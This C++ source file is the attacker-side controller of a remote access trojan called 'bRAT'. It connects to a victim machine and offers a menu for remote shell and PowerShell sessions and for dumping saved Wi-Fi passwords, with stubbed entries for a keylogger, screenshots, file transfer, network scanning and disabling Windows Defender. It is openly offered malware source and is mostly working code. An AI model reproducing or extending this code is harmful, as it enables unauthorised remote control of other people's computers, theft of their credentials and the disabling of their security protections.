#include <stdio.h>
#include "includes/helpers.hpp"

#ifdef _WIN32
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#define timeSleep 10000
#define clear_scr system("cls");
#endif

#ifdef __linux__
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#define IPPROTO_TCP 0
#define clear_scr system("clear");
#endif

class Attacker {
    std::string operatingSystem;
    std::string ipAddr;
    int port;
    static bool hasConnection;
    static int hasBeenCreated;
    SOCKET clientSock;
    char buffer[];

    void clearBuffer() {
        memset(this->buffer, NULL, BUFFER_LENGTH);
    }
    bool sendData(std::string buffer) {
        int iSend = send(clientSock, buffer.c_str(), buffer.size() + 1, 0);
        if (iSend == SOCKET_ERROR) {
            std::cout << "[!] Unable to send data to server " << ipAddr << " on port " << port << std::endl;
#ifdef _WIN32
            std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
#endif
            return false;
        }
        return true;
    }
    std::string recvData() {
        int iRecv;
        char newBuff[BUFFER_LENGTH] = { 0 };
        iRecv = recv(clientSock, newBuff, BUFFER_LENGTH, 0);
        if (iRecv == SOCKET_ERROR) {
            std::cout << "[!] Unable to receive data from server " << ipAddr << " on port " << port << std::endl;
            hasBeenCreated--;
#ifdef _WIN32
            std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
#endif
            return "";
        }
        return newBuff;
    }
    int displayMenu() {
        Helpers::divider();
        int uChoice;
        std::cout << "[x] Following features exist (so far) in bRAT:\n\n";
        std::cout << "1. Get a shell (Note: Some commands like cd, will not work.)\n";
        std::cout << "2. Get a powershell\n";
        std::cout << "3. Dump system info\n";
        std::cout << "4. Get a live screenshot.\n";
        std::cout << "5. Upload file.\n";
        std::cout << "6. Download file.\n";
        std::cout << "7. Dump saved Wi-Fi passwords.\n";
        std::cout << "8. Enable keylogger (Beta)\n";
        std::cout << "9. Scan local network\n";
        std::cout << "10. Disable Windows Defender\n";
        std::cout << "0. Exit\n\n";
        std::cout << "> Enter choice: ";
        std::cin >> uChoice;
        while (uChoice < 0 || uChoice > 10) {
            std::cin.clear();
            std::cin.ignore(INT_MAX, '\n');
            std::cout << "[!] Invalid Choice. Try again: ";
            std::cin >> uChoice;
        }
        Helpers::divider();
        return uChoice;
    }
public:
    Attacker(std::string ipAddr = "127.0.0.1", int port = 6969) : ipAddr(ipAddr), port(port), clientSock(INVALID_SOCKET)
    { }

    void setPort(int port) { this->port = port; }
    void setIPAddress(std::string ipAddr) { this->ipAddr = ipAddr; }

    SOCKET getSocket() {
#ifdef _WIN32
        WSADATA wsaData;
        int iStart = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iStart != NULL) {
            std::cout << "[!] WSAStartup Failed. Error: " << WSAGetLastError() << std::endl;
            system("pause");
            return INVALID_SOCKET;
        }
#endif
        // Create Socket
        auto clientSock = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSock == INVALID_SOCKET) {
            std::cout << "[!] Unable to create socket.\n";
#ifdef _WIN32
            std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
            closesocket(clientSock);
            WSACleanup();
#endif
            return INVALID_SOCKET;
        }

        // Fill in the hint structure.
        // Hint tells the server where to connect to.
        sockaddr_in hint;
        hint.sin_family = AF_INET;
        hint.sin_port = htons(port);
        inet_pton(AF_INET, ipAddr.c_str(), &hint.sin_addr);

        // Connecting to the server.
        int iConnect = connect(clientSock, (sockaddr*)&hint, sizeof(hint));
        if (iConnect == SOCKET_ERROR) {
            std::cout << "[!] Unable to connect to server " << ipAddr << " on port " << port << std::endl;
#ifdef _WIN32
            std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
            closesocket(clientSock);
            WSACleanup();
#endif
            return INVALID_SOCKET;
        }
        return clientSock;
    }

    bool establishConnection() {
        if (hasBeenCreated)
            std::cout << std::endl << std::endl;
        std::cout << "[+] Trying to connect to " << this->ipAddr << ":" << this->port << "...\n";
        hasBeenCreated++;
        clientSock = getSocket();
        if (clientSock == INVALID_SOCKET) {
            hasBeenCreated--;
            return false;
        }
        if (!hasConnection || !hasBeenCreated)
            std::cout << "[*] Connected to server: " << ipAddr << ":" << port << std::endl;
        hasConnection = true;
        return true;
    }

    void invokeShell(bool ps = false) {
        std::string cmd = "invoke-";
        if (ps)
            cmd += "ps-";
        cmd += "shell";

        if (!sendData(cmd)) {
            std::cout << "[!] Unable to invoke shell!\n";
            return;
        }
        std::string prompt = recvData();
        if (prompt == "") {
            std::cout << "[!] Unable to receive data from server. Try re-establishing connection by restarting the RAT.\n";
            return;
        }
        std::string shellName = ps ? "PowerShell" : "Shell";
        std::cout << "[=] Spawned  " << shellName << ". To exit shell, type exitshell.\n";
        std::string uInput;
        int i = 0;
        do {
            std::cout << prompt;
            if (!i++)
                std::cin.ignore();
            std::getline(std::cin, uInput);
            while (uInput == "") {
                std::cout << "Invalid input. Try again\n\n";
                std::cout << prompt;
                std::getline(std::cin, uInput);
            }
            sendData(uInput);
            std::string output = recvData();
            if (output != "exit")
                std::cout << output;
        } while (uInput != "exitshell" && uInput != "shellexit");
    }
    void dumpsysinfo() {}
    void dumpWiFiPasswords() {
        std::string cmd = "get-wifi-passwords";
        sendData(cmd);
        std::string recvd = recvData();
        std::cout << recvd << std::endl;
    }
    void getBanner() {
        if (clientSock == INVALID_SOCKET) {
            std::cout << "[!] No connection established!\n";
            return;
        }
        std::cout << "[*] Fetching system info\n";
        sendData(ipAddr);
        std::string banner = recvData();
        std::cout << banner;

        if (banner.find("Windows") != std::string::npos)
            operatingSystem = "Windows";
        else if (banner.find("Linux") != std::string::npos)
            operatingSystem = "Linux";

        int uChoice;
        do {
            uChoice = displayMenu();
            switch (uChoice) {
            case 0:
                std::cout << "You chose to exit!\n";
                sendData("closeconn");
                closesocket(clientSock);
                break;
                // std::cout << "1. Get a shell (Note: Some commands like cd, will not work.)\n\n";
                // std::cout << "2. Get a powershell\n";
                // std::cout << "3. Dump system info\n";
                // std::cout << "4. Get a live screenshot.\n";
                // std::cout << "5. Upload file.\n";
                // std::cout << "6. Download file.\n";
                // std::cout << "7. Dump saved Wi-Fi passwords.\n";
                // std::cout << "8. Enable keylogger (Beta)\n";
                // std::cout << "9. Scan local network\n";
                // std::cout << "10. "Disable Windows Defender\n";
                // std::cout << "11. Dump Clipboard\n";
                // std::cout << "0. Exit\n\n";
            case 1:
                invokeShell();
                break;
            case 2:
                if (operatingSystem == "Windows")
                    invokeShell(true);
                else {
                    std::cout << std::endl;
                    Helpers::divider();
                    std::cout << "[!] Cannot run a powershell instance on a " << operatingSystem << " machine!\n";
                    Helpers::divider();
                    std::cout << std::endl;
                }
                break;
            case 3:
                dumpsysinfo();
                break;
            case 4:
                break;
            case 5:
                break;
            case 6:
                break;
            case 7:
                dumpWiFiPasswords();
                break;
            case 8:
                break;
            case 9:
                break;
            }
        } while (uChoice != 0);
    }

    //     bool run() {
    //         char buffer[BUFFER_LENGTH] = { 0 };
    //         std::string uInput = "";
    //         printf("%s", buffer);
    //         std::getline(std::cin, uInput);
    //         while (uInput.size() < 0) {
    //             std::cout << "[!] Invalid input. Try again: ";
    //             std::getline(std::cin, uInput);
    //         }
    //         iRecv = 0;
    //         iRecv = recv(clientSock, buffer, BUFFER_LENGTH, 0);
    //         if (iRecv > 0)
    //             printf("%s", buffer);

    // #ifdef _WIN32
    //         WSACleanup();
    // #endif
    //         closesocket(clientSock);
    //     }
};

bool Attacker::hasConnection = false;
int Attacker::hasBeenCreated = 0;

void connect(std::string& ipAddr, int& port) {
    std::cout << "[*] Enter the IP Address you want to connect to: ";
    std::getline(std::cin, ipAddr);
    if (ipAddr == "")
        ipAddr = "127.0.0.1";
    std::cin.clear();
    std::cout << "[*] Enter the port number of the server you want to connect to: ";
    std::cin >> port;
    if (std::cin.fail())
        port = 6969;
    while (port <= 0 || port > 65535) {
        std::cin.clear();
        std::cin.ignore(INT_MAX, '\n');
        std::cout << "[!] Invalid port number. Try again: ";
        std::cin >> port;
    }
}


int main() {

    std::string ip;
    int port;
    // ip = "192.168.0.101";
    ip = "127.0.0.1";
    port = 6969;

    while (true) {
        connect(ip, port);
        std::cin.clear();
        Attacker* attacker = new Attacker(ip, port);
        if (attacker->establishConnection())
            attacker->getBanner();
        Sleep(timeSleep);
        clear_scr
    }
}
